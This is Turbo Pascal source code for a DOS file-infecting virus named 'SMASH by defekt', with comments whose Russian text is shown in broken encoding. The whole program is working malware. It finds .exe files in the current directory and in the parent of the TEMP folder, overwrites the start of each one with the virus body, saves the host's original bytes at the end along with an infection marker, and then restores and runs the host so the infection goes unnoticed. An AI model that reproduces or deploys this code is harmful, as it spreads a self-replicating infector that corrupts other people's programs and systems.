{$S-,I-}             {������� ���������� �� 㬥��襭�� ���� �����}
{$M 5000,0,5000}
uses dos;            {�ᯮ��㥬 �㭪樨 DOSa}
const mel = 4257;    {����� �����}
abvi = 'SMASH by defekt';   {��� ����ࠩ��}
var me,we : file;
met,wet : array[1..mel] of byte;
dir : string;
s_win : byte;
procedure inf;                       {��ࠦ��� 䠩�}
var a : char;
begin
a := '';                            {��⪠ ��ࠦ������}
seek(we,0);                          {���諨 � ��砫� 䠩��}
blockread(we,wet,mel);               {��⠫� ��砫� 䠩�� � ���ᨢ wet}
seek(we,filesize(we));               {��諨 ����� 䠩��}
blockwrite(we,wet,mel);              {����ᠫ� ��� ���ᨢ �㤠}
blockwrite(we,a,1);                  {���⠢��� ���� ��ࠦ������}
seek(we,0);                          {����� � ��砫�}
blockwrite(we,met,mel);              {����ᠫ� ⥫� ����}
close(we);                           {����뫨 䠩���}
end;
procedure chk(path : string);        {�஢�ઠ ��ࠦ������}
var b : byte;
begin
assign(we,path);
reset(we,1);
seek(we,filesize(we)-1);             {��諨 ��᫥���� ���� 䠩��}
blockread(we,b,1);
if b= ord('') then begin s_win := s_win-1; exit;end else inf;  {�᫨ �� ࠢ�� ��襩 ��⪥, ᫥�., ��ࠦ���}
end;
procedure findf;                     {���� 䠩���}
var SR : searchrec;
begin
findfirst('*.exe',$3F,SR);           {�饬 EXE}
while doserror=0 do begin
if s_win=5 then exit;                {�᫨ 6 䠩�, ��室��}
chk(SR.name);                        {���� �� ��ࠦ����}
s_win := s_win+1;                    {���稪 ��ࠦ����� 䠩���}
findnext(SR);
end;
end;
procedure le;                         {����⠭�������� 䠩�-���⥫�}
var i : byte;
p : string;
begin
assign(we,paramstr(0));
reset(we,1);
blockread(we,met,mel);                {��⠫� ����� � ���ᨢ met}
if filesize(we) <= mel then exit;     {�᫨ ����� 䠫� ����� ����� ����� - ��室��}
seek(we,filesize(we)-1);              {�饬 ��᫥���� ����}
truncate(we);                         {����塞 ���}
seek(we,filesize(we)-mel);            {�饬 ��࠭����� ��砫� 䠫�-���⥫�}
blockread(we,wet,mel);                {���뢠�� ���}
truncate(we);                         {��१���}
seek(we,0);                           {� ��砫� 䠫�}
blockwrite(we,wet,mel);               {�����뢠�� ��࠭����� ��砫� �� ���� ⥫� �����}
close(we);
for i := 1 to paramcount do           {����ࠥ� ��� ��ࠬ����}
p := p + paramstr(i);
exec(paramstr(0),p);                  {����᪠�� ����⠭������ 䠩�-���⥫� � ��ࠬ��ࠬ�}
end;
begin
le;                                   {���� �� ����⠭������� 䠩��-���⥫�}
findf;                                {��稭��� �᪠�� 䠫� ��� ��ࠦ����}
dir := GetEnv('TEMP');                {�饬 ��ਪ��� TEMP}
chdir(dir);                           {���室�� �㤠}
chdir('..');                          {���室�� �� �஢��� ��� (� ��⥬��� ��ਪ���)}
findf;                                {��ࠦ��� 䠩�� ⠬}
end.                                  {�����!!!!}